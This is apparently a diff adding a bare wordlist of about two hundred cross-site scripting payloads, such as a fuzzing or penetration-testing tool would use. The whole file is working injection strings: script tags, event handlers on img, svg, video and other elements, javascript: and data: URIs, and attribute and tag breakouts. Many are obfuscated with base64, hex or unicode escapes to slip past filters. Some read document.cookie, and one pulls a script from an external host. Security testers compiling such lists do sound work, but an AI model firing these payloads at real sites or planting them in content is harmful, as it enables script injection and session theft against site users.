@@ -1,0 +1,209 @@
+import('data:text/javascript,alert(1)')
+import('data:text/javascript,confirm(1)')
+import('data:text/javascript,prompt(1)')
+@import'javascript:alert(1)';
+@import'javascript:confirm(1)';
+@import'javascript:prompt(1)';
+<script>import('data:text/javascript,alert(1)')</script>
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>alert(document.domain)</script>
+<script>confirm(document.domain)</script>
+<script>prompt(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm(document.cookie)</script>
+<script>prompt(document.cookie)</script>
+<script>alert(window.origin)</script>
+<script>confirm(window.origin)</script>
+<script>prompt(window.origin)</script>
+<script src=//xss.rocks/xss.js></script>
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=confirm(1)>
+"><img src=x onerror=prompt(1)>
+'><img src=x onerror=alert(1)>
+'><img src=x onerror=confirm(1)>
+'><img src=x onerror=prompt(1)>
+"><svg onload=alert(1)>
+"><svg onload=confirm(1)>
+"><svg onload=prompt(1)>
+'><svg onload=alert(1)>
+'><svg onload=confirm(1)>
+'><svg onload=prompt(1)>
+"><video src=x onerror=alert(1)>
+"><video src=x onerror=confirm(1)>
+"><video src=x onerror=prompt(1)>
+"><audio src=x onerror=alert(1)>
+"><audio src=x onerror=confirm(1)>
+"><audio src=x onerror=prompt(1)>
+"><details open ontoggle=alert(1)>
+"><details open ontoggle=confirm(1)>
+"><details open ontoggle=prompt(1)>
+"><marquee onstart=alert(1)>
+"><marquee onstart=confirm(1)>
+"><marquee onstart=prompt(1)>
+"><iframe srcdoc="<script>alert(1)</script>">
+"><iframe srcdoc="<script>confirm(1)</script>">
+"><iframe srcdoc="<script>prompt(1)</script>">
+</title><script>alert(1)</script>
+</title><script>confirm(1)</script>
+</title><script>prompt(1)</script>
+</textarea><script>alert(1)</script>
+</textarea><script>confirm(1)</script>
+</textarea><script>prompt(1)</script>
+</style><script>alert(1)</script>
+</style><script>confirm(1)</script>
+</style><script>prompt(1)</script>
+</script><script>alert(1)</script>
+</script><script>confirm(1)</script>
+</script><script>prompt(1)</script>
+</textarea><svg onload=alert(1)>
+</textarea><svg onload=confirm(1)>
+</textarea><svg onload=prompt(1)>
+</textarea><img src=x onerror=alert(1)>
+</textarea><img src=x onerror=confirm(1)>
+</textarea><img src=x onerror=prompt(1)>
+<img src=x onerror=alert(1)//
+<img src=x onerror=confirm(1)>
+<img/src=x/onerror=prompt(1)>
+<svg/onload=alert(1)>
+<svg/onload=confirm(1)>
+<svg/onload=prompt(1)>
+<svg onload="alert(1)">
+<svg onload='confirm(1)'>
+<svg onload=prompt(1)//
+<svg/onload=alert`1`>
+<svg/onload=confirm`1`>
+<svg/onload=prompt`1`>
+<a href=javascript:alert(1)>x</a>
+<a href=javascript:confirm(1)>x</a>
+<a href=javascript:prompt(1)>x</a>
+<a href="  javascript:alert(1)">x</a>
+<a href=" 	javascript:confirm(1)">x</a>
+<a href="JaVaScRiPt:prompt(1)">x</a>
+<a href="java&#115;cript:alert(1)">x</a>
+<a href="java&#x09;script:confirm(1)">x</a>
+<a href="\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74:prompt(1)">x</a>
+<form><button formaction=javascript:alert(1)>x</button></form>
+<form><button formaction=javascript:confirm(1)>x</button></form>
+<form><button formaction=javascript:prompt(1)>x</button></form>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html,<script>confirm(1)</script>"></iframe>
+<iframe src="data:text/html,<script>prompt(1)</script>"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4="></iframe>
+<x onmouseover=alert(1)>hover
+<x onmouseenter=confirm(1)>hover
+<x onpointerover=prompt(1)>hover
+<x onclick=alert(1)>click
+<x ondblclick=confirm(1)>click
+<x onpointerdown=prompt(1)>click
+<input onfocus=alert(1) autofocus>
+<input onfocus=confirm(1) autofocus>
+<input onfocus=prompt(1) autofocus>
+callback=alert(1)//
+callback=confirm(1);
+callback=prompt(1)//
+})(alert(1))//
+})(confirm(1))//
+})(prompt(1))//
+${alert(1)}
+${confirm(1)}
+${prompt(1)}
+Function`alert\x28document.domain\x29`()
+Function`confirm\x28document.domain\x29`()
+Function`prompt\x28document.domain\x29`()
+[].constructor.constructor('alert(1)')()
+[].constructor.constructor('confirm(1)')()
+[].constructor.constructor('prompt(1)')()
+eval(atob('YWxlcnQoMSk='))
+eval(atob('Y29uZmlybSgxKQ=='))
+eval(atob('cHJvbXB0KDEp'))
+eval('\x61\x6c\x65\x72\x74(\x31)')
+eval('\x63\x6f\x6e\x66\x69\x72\x6d(\x31)')
+eval('\x70\x72\x6f\x6d\x70\x74(\x31)')
+<svg><script>alert(1)</script></svg>
+<svg><script>confirm(1)</script></svg>
+<svg><script>prompt(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onbegin=confirm(1) attributeName=x dur=1s>
+<svg><animate onbegin=prompt(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<svg><set onbegin=confirm(1) attributeName=x to=1>
+<svg><set onbegin=prompt(1) attributeName=x to=1>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=confirm(1)>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=prompt(1)>
+<!--<img src=x onerror=alert(1)>-->
+<!--<img src=x onerror=confirm(1)>-->
+<!--<img src=x onerror=prompt(1)>-->
+--><img src=x onerror=alert(1)>
+--><img src=x onerror=confirm(1)>
+--><img src=x onerror=prompt(1)>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<meta http-equiv=refresh content="0;url=javascript:confirm(1)">
+<meta http-equiv=refresh content="0;url=javascript:prompt(1)">
+<style>@import'javascript:alert(1)';</style>
+<style>@import'javascript:confirm(1)';</style>
+<style>@import'javascript:prompt(1)';</style>
+<div style="width:expression(alert(1))">x</div>
+<div style="width:expression(confirm(1))">x</div>
+<div style="width:expression(prompt(1))">x</div>
+" onmouseover=alert(1) x="
+" onmouseover=confirm(1) x="
+" onmouseover=prompt(1) x="
+' onmouseover=alert(1) x='
+' onmouseover=confirm(1) x='
+' onmouseover=prompt(1) x='
+" autofocus onfocus=alert(1) x="
+" autofocus onfocus=confirm(1) x="
+" autofocus onfocus=prompt(1) x="
+" onclick=alert(1) x="
+" onclick=confirm(1) x="
+" onclick=prompt(1) x="
+<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
+<svg><p><style><img src=x onerror=confirm(1)></style></p></svg>
+<svg><p><style><img src=x onerror=prompt(1)></style></p></svg>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><p title="</noscript><img src=x onerror=confirm(1)>">
+<noscript><p title="</noscript><img src=x onerror=prompt(1)>">
+<template><img src=x onerror=alert(1)></template>
+<template><img src=x onerror=confirm(1)></template>
+<template><img src=x onerror=prompt(1)></template>
+<noembed><img src=x onerror=alert(1)></noembed>
+<noembed><img src=x onerror=confirm(1)></noembed>
+<noembed><img src=x onerror=prompt(1)></noembed>
+<noframes><img src=x onerror=alert(1)></noframes>
+<noframes><img src=x onerror=confirm(1)></noframes>
+<noframes><img src=x onerror=prompt(1)></noframes>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss id=x tabindex=1 onfocus=confirm(1)></xss>
+<xss id=x tabindex=1 onfocus=prompt(1)></xss>
+<video><source onerror=alert(1)></video>
+<video><source onerror=confirm(1)></video>
+<video><source onerror=prompt(1)></video>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<object data="data:text/html,<script>confirm(1)</script>"></object>
+<object data="data:text/html,<script>prompt(1)</script>"></object>
+<embed src="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>confirm(1)</script>">
+<embed src="data:text/html,<script>prompt(1)</script>">
+#"><img src=x onerror=alert(1)>
+#"><img src=x onerror=confirm(1)>
+#"><img src=x onerror=prompt(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>confirm(1)</scr</script>ipt>
+<scr<script>ipt>prompt(1)</scr</script>ipt>
+<script>al\u0065rt(1)</script>
+<script>con\u0066irm(1)</script>
+<script>pro\u006Dpt(1)</script>
+<script>window['al'%2B'ert'](1)</script>
+<script>window['con'%2B'firm'](1)</script>
+<script>window['pro'%2B'mpt'](1)</script>
+<img src=x onerror=globalThis['alert'](1)>
+<img src=x onerror=globalThis['confirm'](1)>
+<img src=x onerror=globalThis['prompt'](1)>
+<img src=x style=x:expression(alert(1))>
+<img src=x style=x:expression(confirm(1))>
+<img src=x style=x:expression(prompt(1))>
